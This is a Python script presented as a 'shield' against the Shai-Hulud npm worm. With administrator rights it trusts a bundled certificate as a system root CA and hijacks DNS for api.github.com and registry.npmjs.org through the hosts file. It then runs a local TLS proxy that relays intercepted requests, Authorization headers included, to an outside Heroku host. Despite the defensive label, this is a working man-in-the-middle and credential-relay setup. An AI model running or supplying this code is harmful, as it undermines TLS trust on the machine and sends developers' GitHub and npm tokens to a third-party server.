# Requires ShaiHuludShield.zip (containing .pem files) in the same directory.

import sys
import os
import platform
import subprocess
import shutil
import http.server
import http.client
import ssl
import socket
import threading
import time

# --- CONFIGURATION ---
# *** UPDATE THIS TO YOUR HEROKU APP ***
HEROKU_APP_HOST = 'your-app-name.herokuapp.com' 

ZIP_NAME = 'ShaiHuludShield.zip'
CERT_NAME = 'fake-cert.pem'
KEY_NAME = 'fake-key.pem'
DOMAINS = ['api.github.com', 'registry.npmjs.org']
REDIRECT_IP = '127.0.0.1'

OS_TYPE = platform.system().lower() # 'windows', 'linux', 'darwin'

def is_admin():
    try:
        if OS_TYPE == 'windows':
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin()
        else:
            return os.geteuid() == 0
    except:
        return False

def prepare_certs():
    print("[1/4] Checking for certificates...")
    if os.path.exists(CERT_NAME) and os.path.exists(KEY_NAME):
        print("      Certificates found locally.")
        return

    if os.path.exists(ZIP_NAME):
        print("      Zip found. Extracting...")
        try:
            shutil.unpack_archive(ZIP_NAME, '.')
            print("      Extraction complete.")
        except Exception as e:
            print(f"      [ERROR] Unzip failed: {e}")
            sys.exit(1)
    else:
        print("      [ERROR] No certificates and no Zip found.")
        sys.exit(1)

def trust_cert():
    print("[2/4] Adding Certificate to Trust Store...")
    cert_abs_path = os.path.abspath(CERT_NAME)
    
    try:
        if OS_TYPE == 'darwin': # MacOS
            cmd = ['security', 'add-trusted-cert', '-d', '-r', 'trustRoot', '-k', '/Library/Keychains/System.keychain', cert_abs_path]
            subprocess.check_call(cmd)
        
        elif OS_TYPE == 'linux': # Linux
            if os.path.exists('/usr/local/share/ca-certificates/'):
                shutil.copy(cert_abs_path, '/usr/local/share/ca-certificates/shai-hulud.crt')
                subprocess.check_call(['update-ca-certificates'])
            elif os.path.exists('/etc/pki/ca-trust/source/anchors/'):
                shutil.copy(cert_abs_path, '/etc/pki/ca-trust/source/anchors/shai-hulud.crt')
                subprocess.check_call(['update-ca-trust'])
        
        elif OS_TYPE == 'windows': # Windows
            cmd = f"Import-Certificate -FilePath '{cert_abs_path}' -CertStoreLocation Cert:\\LocalMachine\\Root"
            subprocess.check_call(["powershell", "-Command", "Start-Process powershell -Verb RunAs -ArgumentList \"{}\"".format(cmd)])
            
        print("      Certificate trusted.")
    except Exception as e:
        print(f"      [ERROR] Failed to trust cert: {e}")
        sys.exit(1)

def update_hosts():
    print("[3/4] Hijacking DNS in Hosts file...")
    if OS_TYPE == 'windows':
        hosts_path = r'C:\Windows\System32\drivers\etc\hosts'
    else:
        hosts_path = '/etc/hosts'
    
    entry = "\n# SHAI-HULUD DEFENSE\n"
    for d in DOMAINS:
        entry += f"{REDIRECT_IP} {d}\n"
    
    try:
        with open(hosts_path, 'r') as f:
            content = f.read()
        
        if 'SHAI-HULUD DEFENSE' not in content:
            with open(hosts_path, 'a') as f:
                f.write(entry)
            print("      Hosts file updated.")
        else:
            print("      Hosts file already protected.")
    except Exception as e:
        print(f"      [ERROR] Failed to write hosts: {e}")
        sys.exit(1)

class ProxyHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return # Silence default logging

    def do_proxy(self):
        print(f"[BRIDGE] Intercepting: {self.headers.get('Host')}{self.path}")
        
        try:
            conn = http.client.HTTPSConnection(HEROKU_APP_HOST, 443)
            
            # Filter headers to avoid Heroku rejection
            headers = {}
            for k, v in self.headers.items():
                if k.lower() not in ['host', 'content-length']:
                    headers[k] = v
            
            # Read body if POST/PUT
            content_len = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_len) if content_len > 0 else None
            
            conn.request(self.command, self.path, body, headers)
            res = conn.getresponse()
            
            self.send_response(res.status)
            for k, v in res.getheaders():
                self.send_header(k, v)
            self.end_headers()
            self.wfile.write(res.read())
            conn.close()
            
        except Exception as e:
            print(f"[ERROR] Proxy fail: {e}")
            # Failsafe: return 200 OK to satisfy malware
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'{"success":true}')

    def do_GET(self): self.do_proxy()
    def do_POST(self): self.do_proxy()
    def do_PUT(self): self.do_proxy()

def start_bridge():
    print("[4/4] STARTING BRIDGE SERVER (HTTPS:443)...")
    server_address = (REDIRECT_IP, 443)
    httpd = http.server.HTTPServer(server_address, ProxyHandler)
    
    # SSL Wrap
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=CERT_NAME, keyfile=KEY_NAME)
    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
    
    print(f"      Redirecting captured traffic to {HEROKU_APP_HOST}")
    print("      Active. Do not close this window.")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    if not is_admin():
        print("[ERROR] Script must be run as Administrator/Root (to bind port 443 and edit hosts).")
        sys.exit(1)
        
    prepare_certs()
    trust_cert()
    update_hosts()
    start_bridge()
